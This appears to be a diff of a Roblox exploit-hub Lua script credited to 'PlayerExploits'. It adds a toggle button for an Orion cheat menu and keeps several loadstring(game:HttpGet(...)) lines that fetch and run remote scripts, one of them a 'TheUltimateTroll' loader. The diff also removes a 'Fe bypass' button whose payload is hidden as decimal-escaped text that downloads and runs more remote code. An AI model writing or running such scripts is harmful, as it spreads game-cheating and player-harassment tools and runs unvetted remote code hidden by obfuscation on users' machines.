@@ -46,28 +46,53 @@ end
 -- Connect the button click event to the function
 imageButton.MouseButton1Click:Connect(onButtonClick)
 
--- Create and configure the TextButton
-local TextButton = Instance.new("TextButton")
-TextButton.Parent = screenGui
-TextButton.Size = UDim2.new(0, 50, 0, 50)  -- Smaller size
-TextButton.Position = UDim2.new(0, 10, 1, -60)  -- Bottom-left corner with a slight offset
-TextButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- Green color
-TextButton.BackgroundTransparency = 0.5  -- Semi-transparent
-TextButton.Text = "Open"
-TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
-TextButton.Font = Enum.Font.SourceSans
-TextButton.TextScaled = true
+-- Create a ScreenGui and ImageButton if not already created
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
--- Make the button circular
-TextButton.ClipsDescendants = true
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0.5, 0)  -- Makes it circular
-UICorner.Parent = TextButton
+-- Create and configure ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LeftSideToggleButtonGui"
+screenGui.Parent = playerGui
 
--- Function for when the button is clicked
-TextButton.MouseButton1Click:Connect(function()
-    game:GetService("VirtualInputManager"):SendKeyEvent(true, "RightShift", false, game)
-end)
+-- Create and configure ImageButton
+local imageButton = Instance.new("ImageButton")
+imageButton.Size = UDim2.new(0, 50, 0, 50) -- Smaller size for the button
+imageButton.AnchorPoint = Vector2.new(0, 0.5) -- Anchor to the left center
+imageButton.Position = UDim2.new(0, 10, 0.5, 0) -- Positioned on the left side, slightly inset
+imageButton.Image = "rbxassetid://18659702506" -- Your new image ID
+imageButton.Parent = screenGui
+
+-- Create and configure UICorner to make the button slightly rounded
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0.2, 0) -- Slightly rounded corners
+uiCorner.Parent = imageButton
+
+-- Create and configure UIStroke to add a cyan border
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Thickness = 2 -- Thickness of the border
+uiStroke.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
+uiStroke.Parent = imageButton
+
+local toggleState = false
+local function onButtonClick()
+    if toggleState == false then
+        if gethui():FindFirstChild("Orion") then
+    gethui().Orion.Enabled = not gethui().Orion.Enabled
+end
+		UIHidden = true
+    else
+        toggleState = false
+        if gethui():FindFirstChild("Orion") then
+    gethui().Orion.Enabled = not gethui().Orion.Enabled
+end
+    end
+end
+
+-- Connect the button click event to the function
+imageButton.MouseButton1Click:Connect(onButtonClick)
+
+print("Script executed, by PlayerExploits...")
 
 -- Load the library
 local SANS = loadstring(game:HttpGet("https://raw.githubusercontent.com/RScripter/ORION-BLUE-THEME/main/source.lua"))()
@@ -190,7 +215,7 @@ local Section21 = universal:AddSection({
 })
 
 universal:AddButton({
-	Name = "UTH(TheUltimateTroll"),
+	Name = "UTH",
 	Callback = function()
       		getgenv().ActivateTheUltimateTrolly = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Orealated/Oreal/main/orealated%20Easy.gg%20UTH%20Loader", true))();
@@ -379,13 +404,6 @@ FE:AddButton({
   	end    
 })
 
-FE:AddButton({
-	Name = "Fe bypass(idk if its fe)",
-	Callback = function()
-      		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
-  	end    
-})
-
-local Section1 = FE:AddSection({
+local Section2 = FE:AddSection({
 	Name = "_________________________________________________________________________"
 })
